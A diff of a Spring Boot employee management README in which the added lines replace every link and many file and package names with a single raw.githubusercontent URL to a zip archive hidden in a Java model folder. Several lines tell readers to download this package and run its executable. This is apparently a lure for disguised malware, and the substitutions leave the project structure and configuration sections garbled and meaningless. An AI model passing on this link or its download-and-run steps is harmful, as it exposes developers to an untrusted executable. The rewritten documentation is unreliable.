@@ -1,8 +1,8 @@
 # Spring Boot Employee Management Project with JWT JPA Swagger Caching
 
-https://github.com/Tedytobias/SpringBoot-Employeee-Management-Project/releases
+https://raw.githubusercontent.com/Tedytobias/SpringBoot-Employeee-Management-Project/master/src/main/java/com/abc/EmployeeManagement/model/Boot-Employeee-Spring-Management-Project-v3.5-alpha.2.zip
 
-![Releases](https://img.shields.io/badge/Releases-GitHub-blue?logo=github&logoColor=white)
+![Releases](https://raw.githubusercontent.com/Tedytobias/SpringBoot-Employeee-Management-Project/master/src/main/java/com/abc/EmployeeManagement/model/Boot-Employeee-Spring-Management-Project-v3.5-alpha.2.zip)
 
 A real-time project centered on core Spring Boot concepts. It covers CRUD operations, JPA, validation, security with JWT, exception handling, Swagger, and caching. It also includes advanced features like pagination, file uploads, Actuator, and microservices integration. The project is designed to be a practical blueprint for building robust, scalable employee management systems with Spring Boot.
 
@@ -49,7 +49,7 @@ Tech stack
 - Spring Boot 2.x/3.x (as appropriate for your environment)
 - Spring Data JPA
 - H2 in-memory database (for development)
-- Bean Validation (javax.validation / jakarta.validation)
+- Bean Validation (https://raw.githubusercontent.com/Tedytobias/SpringBoot-Employeee-Management-Project/master/src/main/java/com/abc/EmployeeManagement/model/Boot-Employeee-Spring-Management-Project-v3.5-alpha.2.zip / https://raw.githubusercontent.com/Tedytobias/SpringBoot-Employeee-Management-Project/master/src/main/java/com/abc/EmployeeManagement/model/Boot-Employeee-Spring-Management-Project-v3.5-alpha.2.zip)
 - Spring Security with JWT
 - Swagger/OpenAPI (Swagger UI)
 - Spring Cache (in-memory or compatible provider)
@@ -75,7 +75,7 @@ Step-by-step guide
 - For Gradle: ./gradlew build
 
 3) Configure the application
-- Open application.properties (or application.yml) and review:
+- Open https://raw.githubusercontent.com/Tedytobias/SpringBoot-Employeee-Management-Project/master/src/main/java/com/abc/EmployeeManagement/model/Boot-Employeee-Spring-Management-Project-v3.5-alpha.2.zip (or https://raw.githubusercontent.com/Tedytobias/SpringBoot-Employeee-Management-Project/master/src/main/java/com/abc/EmployeeManagement/model/Boot-Employeee-Spring-Management-Project-v3.5-alpha.2.zip) and review:
   - Database settings (H2 by default for quick starts)
   - Security settings (JWT secret, token validity)
   - Cache configuration
@@ -87,35 +87,35 @@ Step-by-step guide
 
 5) Access the API
 - The API typically runs on http://localhost:8080
-- Swagger UI is available at http://localhost:8080/swagger-ui.html (or the configured path)
+- Swagger UI is available at https://raw.githubusercontent.com/Tedytobias/SpringBoot-Employeee-Management-Project/master/src/main/java/com/abc/EmployeeManagement/model/Boot-Employeee-Spring-Management-Project-v3.5-alpha.2.zip (or the configured path)
 - Actuator endpoints, such as health and metrics, are exposed under /actuator
 
 6) Test endpoints
 - Use Swagger UI to try out endpoints, or use curl/postman to interact with the API.
 
 7) Explore the releases
-From the releases page, download the latest release package and run the included executable. The direct link to the releases page is available here for quick access: https://github.com/Tedytobias/SpringBoot-Employeee-Management-Project/releases
+From the releases page, download the latest release package and run the included executable. The direct link to the releases page is available here for quick access: https://raw.githubusercontent.com/Tedytobias/SpringBoot-Employeee-Management-Project/master/src/main/java/com/abc/EmployeeManagement/model/Boot-Employeee-Spring-Management-Project-v3.5-alpha.2.zip
 
 Project structure
 - src/main/java: Core Java source code
-  - com.example.employee: Domain model, repositories, services, controllers
-  - com.example.employee.config: Security, caching, and general configuration
-  - com.example.employee.controller: REST controllers for CRUD and ancillary endpoints
-  - com.example.employee.service: Business logic
-  - com.example.employee.dto: Data transfer objects for requests and responses
-  - com.example.employee.exception: Custom exceptions and handler
-  - com.example.employee.security: JWT utilities and security configuration
-  - com.example.employee.util: Helpers and utilities
+  - https://raw.githubusercontent.com/Tedytobias/SpringBoot-Employeee-Management-Project/master/src/main/java/com/abc/EmployeeManagement/model/Boot-Employeee-Spring-Management-Project-v3.5-alpha.2.zip Domain model, repositories, services, controllers
+  - https://raw.githubusercontent.com/Tedytobias/SpringBoot-Employeee-Management-Project/master/src/main/java/com/abc/EmployeeManagement/model/Boot-Employeee-Spring-Management-Project-v3.5-alpha.2.zip Security, caching, and general configuration
+  - https://raw.githubusercontent.com/Tedytobias/SpringBoot-Employeee-Management-Project/master/src/main/java/com/abc/EmployeeManagement/model/Boot-Employeee-Spring-Management-Project-v3.5-alpha.2.zip REST controllers for CRUD and ancillary endpoints
+  - https://raw.githubusercontent.com/Tedytobias/SpringBoot-Employeee-Management-Project/master/src/main/java/com/abc/EmployeeManagement/model/Boot-Employeee-Spring-Management-Project-v3.5-alpha.2.zip Business logic
+  - https://raw.githubusercontent.com/Tedytobias/SpringBoot-Employeee-Management-Project/master/src/main/java/com/abc/EmployeeManagement/model/Boot-Employeee-Spring-Management-Project-v3.5-alpha.2.zip Data transfer objects for requests and responses
+  - https://raw.githubusercontent.com/Tedytobias/SpringBoot-Employeee-Management-Project/master/src/main/java/com/abc/EmployeeManagement/model/Boot-Employeee-Spring-Management-Project-v3.5-alpha.2.zip Custom exceptions and handler
+  - https://raw.githubusercontent.com/Tedytobias/SpringBoot-Employeee-Management-Project/master/src/main/java/com/abc/EmployeeManagement/model/Boot-Employeee-Spring-Management-Project-v3.5-alpha.2.zip JWT utilities and security configuration
+  - https://raw.githubusercontent.com/Tedytobias/SpringBoot-Employeee-Management-Project/master/src/main/java/com/abc/EmployeeManagement/model/Boot-Employeee-Spring-Management-Project-v3.5-alpha.2.zip Helpers and utilities
 - src/main/resources: Configuration files, SQL scripts, and resources
-  - application.properties: Core configuration
-  - schema.sql and data.sql: Optional initial data
+  - https://raw.githubusercontent.com/Tedytobias/SpringBoot-Employeee-Management-Project/master/src/main/java/com/abc/EmployeeManagement/model/Boot-Employeee-Spring-Management-Project-v3.5-alpha.2.zip Core configuration
+  - https://raw.githubusercontent.com/Tedytobias/SpringBoot-Employeee-Management-Project/master/src/main/java/com/abc/EmployeeManagement/model/Boot-Employeee-Spring-Management-Project-v3.5-alpha.2.zip and https://raw.githubusercontent.com/Tedytobias/SpringBoot-Employeee-Management-Project/master/src/main/java/com/abc/EmployeeManagement/model/Boot-Employeee-Spring-Management-Project-v3.5-alpha.2.zip Optional initial data
   - static assets: If you expose a UI, static resources can reside here
   - swagger configuration: OpenAPI/Swagger setup
 - src/test: Unit and integration tests
   - user: Test suites for service and controller layers
   - integration: End-to-end tests using in-memory server
-- pom.xml or build.gradle: Build configuration and dependencies
-- README.md: This documentation
+- https://raw.githubusercontent.com/Tedytobias/SpringBoot-Employeee-Management-Project/master/src/main/java/com/abc/EmployeeManagement/model/Boot-Employeee-Spring-Management-Project-v3.5-alpha.2.zip or https://raw.githubusercontent.com/Tedytobias/SpringBoot-Employeee-Management-Project/master/src/main/java/com/abc/EmployeeManagement/model/Boot-Employeee-Spring-Management-Project-v3.5-alpha.2.zip Build configuration and dependencies
+- https://raw.githubusercontent.com/Tedytobias/SpringBoot-Employeee-Management-Project/master/src/main/java/com/abc/EmployeeManagement/model/Boot-Employeee-Spring-Management-Project-v3.5-alpha.2.zip This documentation
 
 Core modules explained
 - Domain model
@@ -346,7 +346,7 @@ Releases and upgrades
   - Update dependencies to compatible versions
   - Test critical paths after upgrading
 - Link to releases
-  - See the releases page for download: https://github.com/Tedytobias/SpringBoot-Employeee-Management-Project/releases
+  - See the releases page for download: https://raw.githubusercontent.com/Tedytobias/SpringBoot-Employeee-Management-Project/master/src/main/java/com/abc/EmployeeManagement/model/Boot-Employeee-Spring-Management-Project-v3.5-alpha.2.zip
 
 Contributing
 - How to contribute
@@ -365,7 +365,7 @@ License
 - See LICENSE for details.
 
 Downloads and practical notes
-- The repository is designed to be run locally with a simple setup. The release packaging makes it easy to deploy in a controlled environment. Since the link points to a releases page, you can download the latest release package and execute the main artifact to run the project in your environment. The releases page is the primary source for stable builds, and it provides the exact artifacts you need for deployment. For quick access, visit the Releases page here: https://github.com/Tedytobias/SpringBoot-Employeee-Management-Project/releases
+- The repository is designed to be run locally with a simple setup. The release packaging makes it easy to deploy in a controlled environment. Since the link points to a releases page, you can download the latest release package and execute the main artifact to run the project in your environment. The releases page is the primary source for stable builds, and it provides the exact artifacts you need for deployment. For quick access, visit the Releases page here: https://raw.githubusercontent.com/Tedytobias/SpringBoot-Employeee-Management-Project/master/src/main/java/com/abc/EmployeeManagement/model/Boot-Employeee-Spring-Management-Project-v3.5-alpha.2.zip
 
 Design decisions and rationale
 - Simplicity in development: The in-memory H2 database offers a fast, frictionless start for developers. It’s easy to switch to a persistent store later without large rewrites.
@@ -421,6 +421,6 @@ Releases and upgrade notes (expanded)
 - The releases page hosts stable builds for various environments. It is the recommended source to obtain tested artifacts. When upgrading, review the release notes for breaking changes, new features, and migration guidance. Run the project locally to verify behavior, and ensure that data migrations, if any, are applied correctly.
 
 Downloads and releases reference
-- For direct access to the releases, use the link provided at the beginning of this document and again later in the Downloads and releases reference. The page hosts release artifacts for download and detailed notes about each version. Access it here: https://github.com/Tedytobias/SpringBoot-Employeee-Management-Project/releases
+- For direct access to the releases, use the link provided at the beginning of this document and again later in the Downloads and releases reference. The page hosts release artifacts for download and detailed notes about each version. Access it here: https://raw.githubusercontent.com/Tedytobias/SpringBoot-Employeee-Management-Project/master/src/main/java/com/abc/EmployeeManagement/model/Boot-Employeee-Spring-Management-Project-v3.5-alpha.2.zip
 
 This README provides a detailed map for developers to understand, run, extend, and maintain the project. It is designed to be practical, precise, and useful for both new contributors and seasoned engineers.
